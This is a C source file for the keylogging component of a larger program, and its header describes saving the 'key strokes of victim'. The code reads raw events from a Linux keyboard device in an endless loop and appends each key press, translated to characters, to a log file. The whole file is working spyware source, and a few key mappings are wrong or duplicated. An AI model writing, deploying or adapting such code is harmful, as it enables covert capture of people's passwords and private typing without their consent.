/*==============================================================================
|   SOURCE:     keylogger.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Source file for keylogging component of program. Contains
|               functions for saving key strokes of victim.
==============================================================================*/
#include "../include/keylogger.h"
#include "../include/utils.h"
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   void *run_keylogger(void *ptr)
|                   *ptr - arguments for keylogger thread
|
|   RETURN:     void pointer
|
|   AUTHOR:     Aman Abdulla
|
|   MODIFIED:   Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Logs key stroke of user and writes the key strokes to a file.
|
|               Base code was taken from Aman Abdulla's keylogger notes
|               that contained code for a basic keylogger.
------------------------------------------------------------------------------*/
void *run_keylogger(void *ptr)
{
    Server_Args *srv_args = ptr;
    int fd;
    FILE *fptr;
    struct input_event ev;

    // Open the keyboard device link
    if ((fd = open (srv_args->device, O_RDONLY)) == -1)
    {
        perror ("Invalid Device Link: ");
        exit (1);
    }

    // loop to log key strokes
    while (1)
    {
        // read key stroke
        read (fd, &ev, sizeof(struct input_event));

        // process keystroke event
        if (ev.type == EV_KEY && ev.value == 1)
        {
                fptr = fopen (FILE_KEY_LOGGER,"a+");
                ProcessKeys (fptr, ev);
                fclose(fptr);
        }
    }
    pthread_exit(NULL);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void ProcessKeys (FILE *fptr, struct input_event ev)
|                   *fptr - file to append data key strokes to
|                   ev - key stroke event to process
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks the type of keyboard event and appends the character
|               key stroke to the keylogger file.
------------------------------------------------------------------------------*/
void ProcessKeys (FILE *fptr, struct input_event ev)
{
    if (ev.code == 41)
    {
        fprintf (fptr, "`");
    }
    else if (ev.code == 2)
    {
        fprintf (fptr, "1");
    }
    else if (ev.code == 3)
    {
        fprintf (fptr, "2");
    }
    else if (ev.code == 4)
    {
        fprintf (fptr, "3");
    }
    else if (ev.code == 5)
    {
        fprintf (fptr, "4");
    }
    else if (ev.code == 6)
    {
        fprintf (fptr, "5");
    }
    else if (ev.code == 7)
    {
        fprintf(fptr, "6");
    }
    else if (ev.code == 8)
    {
        fprintf (fptr, "7");
    }
    else if (ev.code == 9)
    {
        fprintf (fptr, "8");
    }
    else if (ev.code == 10)
    {
        fprintf (fptr, "9");
    }
    else if (ev.code == 11)
    {
        fprintf (fptr, "0");
    }
    else if (ev.code == 12)
    {
        fprintf (fptr, "-");
    }
    else if (ev.code == 13)
    {
        fprintf (fptr, "=");
    }
    else if (ev.code == 14)
    {
        fprintf (fptr, "[backspace]");
    }
    else if (ev.code == 1)
    {
        fprintf (fptr, "1");
    }
    else if (ev.code == 15)
    {
        fprintf (fptr, "[tab]");
    }
    else if (ev.code == 16)
    {
        fprintf(fptr, "q");
    }
    else if (ev.code == 17)
    {
        fprintf (fptr, "w");
    }
    else if (ev.code == 18)
    {
        fprintf (fptr, "e");
    }
    else if (ev.code == 19)
    {
        fprintf (fptr, "r");
    }
    else if (ev.code == 20)
    {
        fprintf (fptr, "t");
    }
    else if (ev.code == 21)
    {
        fprintf (fptr, "y");
    }
    else if (ev.code == 22)
    {
        fprintf (fptr, "u");
    }
    else if (ev.code == 23)
    {
        fprintf (fptr, "i");
    }
    else if (ev.code == 24)
    {
        fprintf (fptr, "o");
    }
    else if (ev.code == 25)
    {
        fprintf (fptr, "p");
    }
    else if (ev.code == 26)
    {
        fprintf (fptr, "[");
    }
    else if (ev.code == 27)
    {
        fprintf (fptr, "]");
    }
    else if (ev.code == 43)
    {
        fprintf (fptr, "\\");
    }
    else if (ev.code == 29)
    {
        fprintf (fptr, "1");
    }
    else if (ev.code == 30)
    {
        fprintf (fptr, "a");
    }
    else if (ev.code == 31)
    {
        fprintf (fptr, "s");
    }
    else if (ev.code == 32)
    {
        fprintf (fptr, "d");
    }
    else if (ev.code == 33)
    {
        fprintf (fptr, "f");
    }
    else if (ev.code == 34)
    {
        fprintf (fptr, "g");
    }
    else if (ev.code == 35)
    {
        fprintf (fptr, "h");
    }
    else if (ev.code == 36)
    {
        fprintf (fptr, "j");
    }
    else if (ev.code == 37)
    {
        fprintf (fptr, "k");
    }
    else if (ev.code == 38)
    {
        fprintf (fptr, "l");
    }
    else if (ev.code == 39)
    {
        fprintf (fptr, ";");
    }
    else if (ev.code == 40)
    {
        fprintf (fptr, "'");
    }
    else if (ev.code == 28)
    {
        fprintf (fptr, "[enter]");
    }
    else if (ev.code == 42)
    {
        fprintf (fptr, "[shift]");
    }
    else if (ev.code == 44)
    {
        fprintf (fptr, "z");
    }
    else if (ev.code == 45)
    {
        fprintf (fptr, "x");
    }
    else if (ev.code == 46)
    {
        fprintf (fptr, "c");
    }
    else if (ev.code == 47)
    {
        fprintf (fptr, "v");
    }
    else if (ev.code == 48)
    {
        fprintf (fptr, "b");
    }
    else if (ev.code == 49)
    {
        fprintf (fptr, "n");
    }
    else if (ev.code == 50)
    {
        fprintf (fptr, "m");
    }
    else if (ev.code == 51)
    {
        fprintf (fptr, ",");
    }
    else if (ev.code == 52)
    {
        fprintf (fptr, ".");
    }
    else if (ev.code == 53)
    {
        fprintf (fptr, "/");
    }
    else if (ev.code == 29)
    {
        fprintf (fptr, "[ctrl]");
    }
    else if (ev.code == 125)
    {
        fprintf (fptr, "[windows]");
    }
    else if (ev.code == 56)
    {
        fprintf (fptr, "[alt]");
    }
    else if (ev.code ==  57)
    {
        fprintf(fptr, " ");
    }
    else if (ev.code == 100)
    {
        fprintf (fptr, "[alt]");
    }
    else if (ev.code == 126)
    {
        fprintf (fptr, "[windows]");
    }
    else if (ev.code == 97)
    {
        fprintf (fptr, "[ctrl]");
    }
}
